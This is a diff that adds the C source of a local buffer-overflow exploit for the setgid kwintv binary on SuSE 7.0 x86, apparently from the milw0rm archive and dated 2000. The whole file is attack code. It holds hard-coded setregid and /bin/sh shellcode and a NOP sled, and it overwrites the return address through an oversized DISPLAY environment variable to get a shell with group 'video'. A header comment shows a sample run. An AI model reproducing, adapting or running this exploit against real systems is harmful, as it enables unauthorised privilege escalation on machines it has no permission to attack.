@@ -1,0 +1,90 @@
+/*
+ * (kwintv) local buffer overflow. (gid=video(33))
+ *
+ * Author: Cody Tubbs (loophole of hhp).
+ * www.hhp-programming.net / pigspigs@yahoo.com
+ * 12/17/2000
+ *
+ * For SuSE 7.0 - x86.
+ * sgid "video"(33) by default.
+ *
+ * bash-2.04$ id
+ * uid=1000(loophole) gid=501(noc)
+ * bash-2.04$ ./b 0
+ * Ret-addr 0xbfffe1fc, offset: 0, allign: 0.
+ * sh-2.04$ id
+ * uid=1000(loophole) gid=33(video)
+ * sh-2.04$
+ *
+ */
+
+#include <stdio.h>
+
+#define OFFSET 0
+#define ALLIGN 0
+#define NOP    0x90
+#define DBUF   481 //481+((RET)).
+#define GID    33
+
+static char shellcode[]=
+  "\x31\xdb\x31\xc9\xbb\xff\xff\xff\xff\xb1\x00\x31\xc0"
+  "\xb0\x47\xcd\x80\x31\xdb\x31\xc9\xb3\x00\xb1\x00\x31"
+  "\xc0\xb0\x47\xcd\x80\xeb\x1f\x5e\x89\x76\x08\x31\xc0"
+  "\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08"
+  "\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8"
+  "\xdc\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x69";
+
+long get_sp(void){
+  __asm__("movl %esp,%eax");
+}
+
+void workit(char *heh){
+  fprintf(stderr, "\n(kwintv) local exploit for SuSE 7.0 - x86\n");
+  fprintf(stderr, "Author: Cody Tubbs (loophole of hhp)\n\n");
+  fprintf(stderr, "Usage: %s <offset> [allign(0..3)]\n", heh);
+  fprintf(stderr, "Examp: %s 0\n", heh);
+  fprintf(stderr, "Examp: %s 0 1\n", heh);
+  exit(1);
+}
+
+
+main(int argc, char **argv){
+  char eipeip[DBUF], buffer[4096], heh[DBUF+1];
+  int i, offset, gid, allign;
+  long address;
+
+  if(argc<2){
+    workit(argv[0]);
+  }
+ 
+  if(argc>1){offset=atoi(argv[1]);}else{offset=OFFSET;}
+  if(argc>2){allign=atoi(argv[2]);}else{allign=ALLIGN;}
+
+  address=get_sp()-offset;
+
+  if(allign>0){for(i=0;i<allign;i++){eipeip[i]=0x69;}}//0x69.HEH.:D
+  for(i=allign;i<DBUF;i+=4){*(long *)&eipeip[i]=address;}
+
+  gid=GID;
+  shellcode[10]=gid;
+  shellcode[22]=gid;
+  shellcode[24]=gid;
+ 
+  for(i=0;i<(4096-strlen(shellcode)-strlen(eipeip));i++){
+    buffer[i]=NOP;
+  }
+ 
+  memcpy(heh, eipeip, strlen(eipeip));
+  memcpy(heh, "DISPLAY=", 8);
+  putenv(heh);
+
+  memcpy(buffer+i, shellcode, strlen(shellcode));
+  memcpy(buffer, "KWINEX=", 7);
+  putenv(buffer);
+ 
+  fprintf(stderr, "Ret-addr %#x, offset: %d, allign: %d.\n",address,offset,allign);
+  execlp("/opt/kde/bin/kwintv", "kwintv", 0);//Change path if needed. :D
+}
+
+
+// milw0rm.com [2000-12-06]
